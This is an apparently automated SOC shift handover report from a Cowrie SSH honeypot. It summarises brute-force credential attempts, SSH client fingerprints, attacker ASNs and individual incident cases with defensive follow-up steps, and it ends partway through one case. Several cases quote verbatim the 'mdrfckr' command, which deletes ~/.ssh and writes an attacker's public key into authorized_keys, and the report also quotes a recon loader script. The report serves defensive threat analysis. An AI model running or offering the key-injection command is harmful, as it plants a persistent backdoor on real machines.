# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-12 |
| **Generated At** | 2026-10-12T03:09:18Z |
| **Shift Time** | 03:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **74** |
| Confirmed Threats | **60** |
| False Positives Filtered | **14** (18.9%) |
| Unique Attacker IPs | **57** |
| Countries of Origin | **20** |
| High Severity Cases | **23** |
| Medium Severity Cases | **1** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **2056** |
| Unique Credential Pairs | **1920** |
| Unique Usernames | **924** |
| Unique Passwords | **1221** |
| Successful Auth Pairs | **2016** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 482 |
| `ubuntu` | 104 |
| `admin` | 45 |
| `user` | 33 |
| `deploy` | 22 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 87 |
| `123` | 40 |
| `1234` | 30 |
| `12345678` | 26 |
| `1` | 20 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `` | 6 |
| `support` | `support` | 6 |
| `root` | `123456` | 6 |
| `root` | `3245gs5662d34` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `zaq123zaq` | `77.239.124.150` | 2026-10-12T00:00:06 |
| `thai` | `thai` | `10.0.0.73` | 2026-10-12T00:00:06 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-10-12T00:00:10 |
| `root` | `!Q2w3e4r` | `77.239.124.150` | 2026-10-12T00:00:11 |
| `thai` | `3245gs5662d34` | `10.0.0.73` | 2026-10-12T00:00:12 |
| `root` | `123456789` | `77.239.124.150` | 2026-10-12T00:00:17 |
| `ubuntu` | `root123` | `77.239.124.150` | 2026-10-12T00:00:22 |
| `debian` | `123` | `77.239.124.150` | 2026-10-12T00:00:28 |
| `wangjing` | `wangjing` | `77.239.124.150` | 2026-10-12T00:00:33 |
| `ali` | `ali` | `77.239.124.150` | 2026-10-12T00:00:40 |
| `aaa` | `123456` | `77.239.124.150` | 2026-10-12T00:00:46 |
| `root` | `000000` | `77.239.124.150` | 2026-10-12T00:00:51 |
| `jay` | `jay` | `77.239.124.150` | 2026-10-12T00:00:57 |
| `user` | `1234` | `77.239.124.150` | 2026-10-12T00:01:02 |
| `deploy` | `deploy` | `77.239.124.150` | 2026-10-12T00:01:07 |
| `poison` | `poison` | `10.0.0.73` | 2026-10-12T00:01:08 |
| `admin2` | `admin2` | `77.239.124.150` | 2026-10-12T00:01:18 |
| `root` | `Password123!@` | `77.239.124.150` | 2026-10-12T00:01:24 |
| `user` | `123123` | `77.239.124.150` | 2026-10-12T00:01:29 |
| `root` | `14159265` | `77.239.124.150` | 2026-10-12T00:01:35 |
_… 1996 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **74** |
| Sessions with Fingerprint | **19** |
| Unique HASSH Fingerprints | **19** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 18 |
| libssh | 16 |
| Unknown | 2 |
| Paramiko (Python) | 2 |
| AsyncSSH (Python) | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 10 | 5 |
| `2ec37a7cc8da...` | Mirai/variant | 4 | 2 |
| `0a07365cc01f...` | Generic scanner | 3 | 2 |
| `03a80b21afa8...` | Modern SSH client | 2 | 2 |
| `f1e5e9d24e5e...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 10 | 5 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 4 | 2 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 3 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 32 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.49`, `92.118.39.77`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `49.231.192.36`, `154.201.89.198`, `119.96.159.237`, `4.224.59.75`, `49.204.74.149`, `104.28.201.73`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **57** |
| Unique ASNs | **31** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 16 | HIGH |
| `AS4766` | Korea Telecom | 6 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS2860` | NOS COMUNICACOES, S.A. | 2 | HIGH |
| `AS198364` | BANATSYNC SRL | 2 | HIGH |
| `AS7303` | Telecom Argentina S.A. | 2 | LOW |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (22)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7994d11f01c6

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]150` |
| **First Seen** | 2026-10-12 00:00 |
| **Last Seen** | 2026-10-12 00:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:00:05` | `cowrie.session.connect` |
| `2026-10-12 00:00:05` | `cowrie.client.version` |
| `2026-10-12 00:00:05` | `cowrie.client.kex` |
| `2026-10-12 00:00:06` | `cowrie.login.success` |
| `2026-10-12 00:00:06` | `cowrie.session.params` |
| `2026-10-12 00:00:06` | `cowrie.command.input` |
| `2026-10-12 00:00:06` | `cowrie.log.closed` |
| `2026-10-12 00:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]150` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fc42ac38ea0

| Field | Detail |
|---|---|
| **Source IP** | `119.96.159[.]237` |
| **First Seen** | 2026-10-12 00:02 |
| **Last Seen** | 2026-10-12 00:08 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:02:59` | `cowrie.session.connect` |
| `2026-10-12 00:02:59` | `cowrie.client.version` |
| `2026-10-12 00:02:59` | `cowrie.client.kex` |
| `2026-10-12 00:03:00` | `cowrie.login.success` |
| `2026-10-12 00:03:01` | `cowrie.session.params` |
| `2026-10-12 00:03:01` | `cowrie.command.input` |
| `2026-10-12 00:03:01` | `cowrie.command.failed` |
| `2026-10-12 00:03:02` | `cowrie.log.closed` |
| `2026-10-12 00:03:03` | `cowrie.session.params` |
| `2026-10-12 00:03:03` | `cowrie.command.input` |
| `2026-10-12 00:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.159[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.96.159[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8e725c45a9a

| Field | Detail |
|---|---|
| **Source IP** | `104.28.201[.]73` |
| **First Seen** | 2026-10-12 00:05 |
| **Last Seen** | 2026-10-12 00:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:05:15` | `cowrie.session.connect` |
| `2026-10-12 00:05:15` | `cowrie.client.version` |
| `2026-10-12 00:05:15` | `cowrie.client.kex` |
| `2026-10-12 00:05:16` | `cowrie.login.success` |
| `2026-10-12 00:05:16` | `cowrie.session.params` |
| `2026-10-12 00:05:16` | `cowrie.command.input` |
| `2026-10-12 00:05:16` | `cowrie.command.failed` |
| `2026-10-12 00:05:17` | `cowrie.log.closed` |
| `2026-10-12 00:05:17` | `cowrie.session.params` |
| `2026-10-12 00:05:17` | `cowrie.command.input` |
| `2026-10-12 00:05:17` | `cowrie.session.file_download` |
| `2026-10-12 00:05:17` | `cowrie.log.closed` |
| `2026-10-12 00:05:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.201[.]73` to AbuseIPDB if not already reported
- [ ] Block `104.28.201[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0635874bc4e8

| Field | Detail |
|---|---|
| **Source IP** | `104.28.201[.]73` |
| **First Seen** | 2026-10-12 00:05 |
| **Last Seen** | 2026-10-12 00:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:05:17` | `cowrie.session.connect` |
| `2026-10-12 00:05:17` | `cowrie.client.version` |
| `2026-10-12 00:05:17` | `cowrie.client.kex` |
| `2026-10-12 00:05:18` | `cowrie.login.success` |
| `2026-10-12 00:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.201[.]73` to AbuseIPDB if not already reported
- [ ] Block `104.28.201[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-184001dddb71

| Field | Detail |
|---|---|
| **Source IP** | `154.201.89[.]198` |
| **First Seen** | 2026-10-12 00:05 |
| **Last Seen** | 2026-10-12 00:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:05:45` | `cowrie.session.connect` |
| `2026-10-12 00:05:45` | `cowrie.client.version` |
| `2026-10-12 00:05:45` | `cowrie.client.kex` |
| `2026-10-12 00:05:45` | `cowrie.login.success` |
| `2026-10-12 00:05:46` | `cowrie.session.params` |
| `2026-10-12 00:05:46` | `cowrie.command.input` |
| `2026-10-12 00:05:46` | `cowrie.command.failed` |
| `2026-10-12 00:05:46` | `cowrie.log.closed` |
| `2026-10-12 00:05:47` | `cowrie.session.params` |
| `2026-10-12 00:05:47` | `cowrie.command.input` |
| `2026-10-12 00:05:47` | `cowrie.session.file_download` |
| `2026-10-12 00:05:47` | `cowrie.log.closed` |
| `2026-10-12 00:05:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.201.89[.]198` to AbuseIPDB if not already reported
- [ ] Block `154.201.89[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14c862617d29

| Field | Detail |
|---|---|
| **Source IP** | `154.201.89[.]198` |
| **First Seen** | 2026-10-12 00:05 |
| **Last Seen** | 2026-10-12 00:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:05:48` | `cowrie.session.connect` |
| `2026-10-12 00:05:48` | `cowrie.client.version` |
| `2026-10-12 00:05:48` | `cowrie.client.kex` |
| `2026-10-12 00:05:48` | `cowrie.login.success` |
| `2026-10-12 00:05:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.201.89[.]198` to AbuseIPDB if not already reported
- [ ] Block `154.201.89[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01d98bf88aad

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-10-12 00:09 |
| **Last Seen** | 2026-10-12 00:09 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:09:42` | `cowrie.session.connect` |
| `2026-10-12 00:09:42` | `cowrie.client.version` |
| `2026-10-12 00:09:42` | `cowrie.client.kex` |
| `2026-10-12 00:09:44` | `cowrie.login.success` |
| `2026-10-12 00:09:45` | `cowrie.session.params` |
| `2026-10-12 00:09:45` | `cowrie.command.input` |
| `2026-10-12 00:09:45` | `cowrie.command.failed` |
| `2026-10-12 00:09:46` | `cowrie.log.closed` |
| `2026-10-12 00:09:47` | `cowrie.session.params` |
| `2026-10-12 00:09:47` | `cowrie.command.input` |
| `2026-10-12 00:09:48` | `cowrie.session.file_download` |
| `2026-10-12 00:09:48` | `cowrie.log.closed` |
| `2026-10-12 00:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45feeaa1e32c

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-10-12 00:09 |
| **Last Seen** | 2026-10-12 00:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:09:49` | `cowrie.session.connect` |
| `2026-10-12 00:09:49` | `cowrie.client.version` |
| `2026-10-12 00:09:49` | `cowrie.client.kex` |
| `2026-10-12 00:09:51` | `cowrie.login.success` |
| `2026-10-12 00:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-917ef35b3389

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-10-12 00:15 |
| **Last Seen** | 2026-10-12 00:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:15:09` | `cowrie.session.connect` |
| `2026-10-12 00:15:09` | `cowrie.client.version` |
| `2026-10-12 00:15:09` | `cowrie.client.kex` |
| `2026-10-12 00:15:11` | `cowrie.login.success` |
| `2026-10-12 00:15:12` | `cowrie.session.params` |
| `2026-10-12 00:15:12` | `cowrie.command.input` |
| `2026-10-12 00:15:12` | `cowrie.command.input` |
| `2026-10-12 00:15:12` | `cowrie.command.input` |
| `2026-10-12 00:15:12` | `cowrie.command.input` |
| `2026-10-12 00:15:12` | `cowrie.command.input` |
| `2026-10-12 00:15:12` | `cowrie.command.success` |
| `2026-10-12 00:15:12` | `cowrie.command.input` |
| `2026-10-12 00:15:12` | `cowrie.command.input` |
| `2026-10-12 00:15:12` | `cowrie.command.input` |
| `2026-10-12 00:15:12` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cba53661320

| Field | Detail |
|---|---|
| **Source IP** | `4.224.59[.]75` |
| **First Seen** | 2026-10-12 00:44 |
| **Last Seen** | 2026-10-12 00:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:44:18` | `cowrie.session.connect` |
| `2026-10-12 00:44:18` | `cowrie.client.version` |
| `2026-10-12 00:44:19` | `cowrie.client.kex` |
| `2026-10-12 00:44:19` | `cowrie.login.success` |
| `2026-10-12 00:44:20` | `cowrie.session.params` |
| `2026-10-12 00:44:20` | `cowrie.command.input` |
| `2026-10-12 00:44:20` | `cowrie.command.failed` |
| `2026-10-12 00:44:21` | `cowrie.log.closed` |
| `2026-10-12 00:44:21` | `cowrie.session.params` |
| `2026-10-12 00:44:21` | `cowrie.command.input` |
| `2026-10-12 00:44:22` | `cowrie.session.file_download` |
| `2026-10-12 00:44:22` | `cowrie.log.closed` |
| `2026-10-12 00:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.224.59[.]75` to AbuseIPDB if not already reported
- [ ] Block `4.224.59[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c23ba59796b

| Field | Detail |
|---|---|
| **Source IP** | `4.224.59[.]75` |
| **First Seen** | 2026-10-12 00:44 |
| **Last Seen** | 2026-10-12 00:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:44:22` | `cowrie.session.connect` |
| `2026-10-12 00:44:22` | `cowrie.client.version` |
| `2026-10-12 00:44:22` | `cowrie.client.kex` |
| `2026-10-12 00:44:23` | `cowrie.login.success` |
| `2026-10-12 00:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.224.59[.]75` to AbuseIPDB if not already reported
- [ ] Block `4.224.59[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c8c8836074a

| Field | Detail |
|---|---|
| **Source IP** | `49.204.74[.]149` |
| **First Seen** | 2026-10-12 00:46 |
| **Last Seen** | 2026-10-12 00:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:46:53` | `cowrie.session.connect` |
| `2026-10-12 00:46:53` | `cowrie.client.version` |
| `2026-10-12 00:46:53` | `cowrie.client.kex` |
| `2026-10-12 00:46:54` | `cowrie.login.success` |
| `2026-10-12 00:46:55` | `cowrie.session.params` |
| `2026-10-12 00:46:55` | `cowrie.command.input` |
| `2026-10-12 00:46:55` | `cowrie.command.failed` |
| `2026-10-12 00:46:56` | `cowrie.log.closed` |
